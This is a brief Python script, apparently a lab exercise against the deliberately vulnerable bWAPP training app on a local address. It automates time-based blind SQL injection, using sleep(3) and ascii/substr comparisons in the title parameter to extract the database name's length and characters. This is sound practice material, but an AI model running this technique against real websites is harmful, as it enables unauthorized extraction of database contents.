#coding:utf-8
import requests
import time
#ip地址需要根据实际情况进行修改
ip_port="192.168.0.105:80"
data={
	"login":"bee",
	"password":"bug",
	"security_level":"0",
	"form":"submit"
}
urlLogin="http://%s/login.php"%ip_port
session=requests.session()
resp=session.post(urlLogin,data)
num=0

#获取数据库名称长度
for i in range(1,21):
	url="http://%s/sqli_15.php?title=World War Z' and length(database())=%d and sleep(3) -- &action=search"%(ip_port,i) 
	startTime=time.time()
	rsp=session.get(url)
	endTime=time.time()
	ga=endTime-startTime
	if ga>1:
		print("length of database name is %d"%i)
		print(startTime)
		print(endTime)
		num=i
		break

#获取数据库名字
l=[]
print("%d"%num)
for j in range(1,num+1):
	for k in range(33,128):
		url="http://%s/sqli_15.php?title=World War Z' and ascii(substr(database(),%d,1))=%d   and sleep(3) -- &action=search"%(ip_port,j,k)
		startTime=time.time()
		rsp=session.get(url)
		endTime=time.time()
		ga=endTime-startTime
		if ga>1:
			print(chr(k))
			l.append(chr(k))
			break
print(l)

